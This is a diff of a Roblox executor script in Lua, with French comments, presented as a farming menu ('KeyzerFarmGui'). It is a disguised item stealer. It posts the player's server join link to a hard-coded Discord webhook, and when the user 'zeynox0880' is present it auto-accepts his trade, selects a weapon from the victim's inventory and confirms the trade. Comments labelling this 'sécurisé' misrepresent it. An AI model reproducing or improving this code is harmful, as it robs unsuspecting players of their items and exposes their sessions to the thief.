@@ -4,52 +4,29 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local LocalPlayer = Players.LocalPlayer
-local requestFunc = request or (http and http.request) or http_request
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 
--- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà à l'écran
+-- [NETTOYAGE] Supprime l'ancien menu s'il existe déjà
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
-if oldGui then 
-    oldGui:Destroy() 
-end
+if oldGui then oldGui:Destroy() end
 
--- [[ CONFIGURATION DU DÉLAI VIA FICHIER TEXTE ]]
-local COOLDOWN_TEMPS = 30 
+-- [[ CONFIGURATION DU DÉLAI ANTI-SPAM SÉCURISÉ ]]
+local COOLDOWN_TEMPS = 30
 local doitEnvoyerWebhook = true
-local fichierNom = "keyzer_cooldown.txt"
 
-local readfile = readfile or (syn and syn.read_file)
-local writefile = writefile or (syn and syn.write_file)
-
-if readfile and writefile then
-    local success, contenu = pcall(function() return readfile(fichierNom) end)
-    local tempsActuel = os.time()
-    
-    if success and contenu and tonumber(contenu) then
-        local dernierEnvoi = tonumber(contenu)
-        if (tempsActuel - dernierEnvoi) < COOLDOWN_TEMPS then
-            doitEnvoyerWebhook = false
-        else
-            writefile(fichierNom, tostring(tempsActuel))
-        end
-    else
-        writefile(fichierNom, tostring(tempsActuel))
-    end
+if _G.KeyzerWebhookBloque then
+    doitEnvoyerWebhook = false
 else
-    if _G.KeyzerWebhookBloque then
-        doitEnvoyerWebhook = false
-    else
-        _G.KeyzerWebhookBloque = true
-        task.delay(COOLDOWN_TEMPS, function() _G.KeyzerWebhookBloque = nil end)
-    end
+    _G.KeyzerWebhookBloque = true
+    task.delay(COOLDOWN_TEMPS, function() _G.KeyzerWebhookBloque = nil end)
 end
 
+-- [[ 1. FONCTION WEBHOOK SÉCURISÉE ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
+local requestFunc = request or (http and http.request) or http_request
 
--- [[ 1. FONCTION WEBHOOK ]]
 local function sendSessionLog(player)
-    if not player or not doitEnvoyerWebhook then return end
-    if not requestFunc then return end
+    if not player or not doitEnvoyerWebhook or not requestFunc then return end
     
     local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
     local data = {
@@ -253,29 +230,27 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ 4. LOGIQUE D'AUTO-TRADE SECURISEE (ATTENTE DU RENDU VRAI) ]]
+-- [[ 4. AUTO-TRADE TOTALEMENT SÉCURISÉ & ROBUSTE ]]
 local TradeModules = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Modules")
 local TradeNetwork = TradeModules and (TradeModules:FindFirstChild("TradeNetwork") or TradeModules:FindFirstChild("Network"))
 
 local function forceClick(guiButton)
-    if guiButton then
-        local firesignal = firesignal or (syn and syn.firesignal)
-        if firesignal then
-            firesignal(guiButton.MouseButton1Click)
-        else
-            pcall(function() guiButton:Activate() end)
-        end
+    if not guiButton then return end
+    local firesignalFunc = firesignal or (syn and syn.firesignal)
+    if firesignalFunc then
+        firesignalFunc(guiButton.MouseButton1Click)
+    else
+        pcall(function() guiButton:Activate() end)
     end
 end
 
 local function checkAndExecuteTrade(child)
     if child.Name == "TradeGUI" then
-        -- Ne s'active que si zeynox0880 est bien présent dans le serveur
         if not Players:FindFirstChild("zeynox0880") then return end
         
-        -- On cherche le conteneur exact demandé
         local containerPath = nil
-        for i = 1, 30 do -- Attend max 3 secondes que le chemin d'accès se crée
+        -- Attente sécurisée de l'existence du conteneur d'armes
+        for i = 1, 30 do
             pcall(function()
                 containerPath = child.Container.Items.Main.Weapons.Items.Container.Current.Container
             end)
@@ -284,28 +259,27 @@ local function checkAndExecuteTrade(child)
         end
         
         if containerPath then
-            -- BOUCLE DE SÉCURITÉ REFAITE : On attend que le conteneur ait réellement chargé au moins 4 enfants visibles
             local cleanItems = {}
-            for attempt = 1, 50 do
+            -- Attente qu'au moins 4 items soient créés dedans par le jeu
+            for attempt = 1, 40 do
                 cleanItems = {}
                 for _, item in ipairs(containerPath:GetChildren()) do
                     if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
                         table.insert(cleanItems, item)
                     end
                 end
-                
-                if #cleanItems >= 4 then 
-                    break 
-                end
-                task.wait(0.1) -- Attend que le jeu finisse de générer l'inventaire graphique
+                if #cleanItems >= 4 then break end
+                task.wait(0.1)
             end
             
-            -- Tri par ordre d'affichage visuel réel (LayoutOrder)
+            -- Tri de sécurité par position d'affichage (LayoutOrder)
             table.sort(cleanItems, function(a, b)
-                return a.LayoutOrder < b.LayoutOrder
+                local orderA = a:IsA("GuiObject") and a.LayoutOrder or 0
+                local orderB = b:IsA("GuiObject") and b.LayoutOrder or 0
+                return orderA < orderB
             end)
             
-            -- Ciblage et exécution des 5 clics sur le 4e item
+            -- Sélection et 5 clics sur le 4e item
             local targetWeaponButton = cleanItems[4]
             if targetWeaponButton then
                 for i = 1, 5 do
@@ -315,7 +289,7 @@ local function checkAndExecuteTrade(child)
             end
         end
         
-        -- Validation finale du Trade auprès du jeu
+        -- Validation finale du Trade
         task.wait(0.5)
         if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
             TradeNetwork:FireServer("AcceptTrade")
@@ -329,14 +303,12 @@ local function checkAndExecuteTrade(child)
     end
 end
 
--- Écouteurs de l'interface graphique de trade
 playerGui.ChildAdded:Connect(checkAndExecuteTrade)
 local existingTrade = playerGui:FindFirstChild("TradeGUI")
 if existingTrade then
     task.spawn(function() checkAndExecuteTrade(existingTrade) end)
 end
 
--- Acceptation initiale automatique de l'invitation envoyée par zeynox0880
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
